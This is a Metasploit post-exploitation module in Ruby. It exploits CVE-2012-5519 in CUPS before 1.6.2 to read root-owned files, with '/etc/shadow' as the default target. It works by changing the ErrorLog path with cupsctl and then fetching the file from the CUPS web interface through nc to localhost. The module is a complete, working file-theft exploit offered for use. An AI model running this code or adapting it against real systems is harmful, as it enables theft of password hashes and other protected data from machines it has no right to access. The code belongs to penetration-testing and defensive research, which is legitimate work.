##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File

  LP_GROUPS = ['lpadmin', '_lpadmin']

  attr_accessor :web_server_was_disabled, :error_log_was_reset

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'CUPS 1.6.1 Root File Read',
        'Description' => %q{
          This module exploits a vulnerability in CUPS < 1.6.2, an open source printing system.
          CUPS allows members of the lpadmin group to make changes to the cupsd.conf
          configuration, which can specify an Error Log path. When the user visits the
          Error Log page in the web interface, the cupsd daemon (running with setuid root)
          reads the Error Log path and echoes it as plaintext.

          This module is known to work on Mac OS X < 10.8.4 and Ubuntu Desktop <= 12.0.4
          as long as the session is in the lpadmin group.

          Warning: if the user has set up a custom path to the CUPS error log,
          this module might fail to reset that path correctly. You can specify
          a custom error log path with the ERROR_LOG datastore option.
        },
        'References' => [
          ['CVE', '2012-5519'],
          ['OSVDB', '87635'],
          ['URL', 'https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=692791']
        ],
        'License' => MSF_LICENSE,
        'Author' => [
          'Jann Horn', # discovery
          'joev' # metasploit module
        ],
        'DisclosureDate' => '2012-11-20',
        'Platform' => %w[linux osx],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK, CONFIG_CHANGES],
          'Reliability' => []
        }
      )
    )
    register_options([
      OptString.new('FILE', [true, 'The file to steal.', '/etc/shadow']),
      OptString.new('ERROR_LOG',
                    [true, 'The original path to the CUPS error log', '/var/log/cups/error_log'])
    ])
  end

  def check_exploitability
    user = cmd_exec('whoami')
    user_groups = cmd_exec("groups #{[user].shelljoin}").split(/\s+/)
    if (user_groups & LP_GROUPS).empty?
      print_error 'User not in lpadmin group.'
      return Msf::Exploit::CheckCode::Safe
    end

    print_good 'User in lpadmin group, continuing...'

    if ctl_path.blank?
      print_error 'cupsctl binary not found in $PATH'
      return Msf::Exploit::CheckCode::Safe
    end

    print_good 'cupsctl binary found in $PATH'

    nc_path = whereis('nc')
    if nc_path.nil? || nc_path.blank?
      print_error 'Could not find nc executable'
      return Msf::Exploit::CheckCode::Unknown
    end

    print_good 'nc binary found in $PATH'

    config_path = whereis('cups-config')
    config_vn = nil

    if config_path.nil? || config_path.blank?
      # cups-config not present, ask the web interface what vn it is
      output = get_request('/')
      if output =~ /title.*CUPS\s+([\d.]+)/i
        config_vn = ::Regexp.last_match(1).strip
      end
    else
      config_vn = cmd_exec('cups-config --version').strip # use cups-config if installed
    end

    if config_vn.nil?
      print_error 'Could not determine CUPS version.'
      return Msf::Exploit::CheckCode::Unknown
    end

    print_status "Found CUPS #{config_vn}"

    config_parts = config_vn.split('.')
    if (config_vn.to_f < 1.6) || ((config_vn.to_f <= 1.6) && (config_parts[2].to_i < 2)) # <1.6.2
      Msf::Exploit::CheckCode::Vulnerable
    else
      Msf::Exploit::CheckCode::Safe
    end
  end

  def run
    if check_exploitability == Msf::Exploit::CheckCode::Safe
      print_error 'Target machine not vulnerable, bailing.'
      return
    end

    defaults = cmd_exec(ctl_path)
    @web_server_was_disabled = defaults =~ /^WebInterface=no$/i

    # first we set the error log to the path intended
    cmd_exec("#{ctl_path} ErrorLog=#{datastore['FILE']}")
    cmd_exec("#{ctl_path} WebInterface=yes")
    @error_log_was_reset = true

    # now we go grab it from the ErrorLog route
    file = strip_http_headers(get_request('/admin/log/error_log'))

    # and store as loot
    f = File.basename(datastore['FILE'])
    loot = store_loot('cups_file_read', 'application/octet-stream', session, file, f)
    print_good("File #{datastore['FILE']} (#{file.length} bytes) saved to #{loot}")
  end

  def cleanup
    print_status 'Cleaning up...'
    cmd_exec("#{ctl_path} WebInterface=no") if web_server_was_disabled
    cmd_exec("#{ctl_path} ErrorLog=#{prev_error_log_path}") if error_log_was_reset
  ensure
    super
  end

  private

  def prev_error_log_path
    datastore['ERROR_LOG']
  end

  def ctl_path
    @ctl_path ||= whereis('cupsctl')
  end

  def strip_http_headers(http)
    http.gsub(/\A(^.*\r\n)*/, '')
  end

  def whereis(exe)
    line = cmd_exec("whereis #{exe}")
    if line =~ /^\S+:\s*(\S*)/i
      ::Regexp.last_match(1) # on ubuntu whereis returns "cupsctl: /usr/sbin/cupsctl"
    else
      line # on osx it just returns '/usr/sbin/cupsctl'
    end
  end

  def get_request(uri)
    output = perform_request(uri, 'nc -j localhost 631')

    if output =~ /^(?:usage: nc|nc: invalid option -- 'j')/
      output = perform_request(uri, 'nc localhost 631')
    end

    output
  end

  def perform_request(uri, nc_str)
    # osx requires 3 newlines!
    cmd_exec(['printf', "GET #{uri}\r\n\r\n\r\n".inspect, '|', nc_str].join(' '))
  end
end
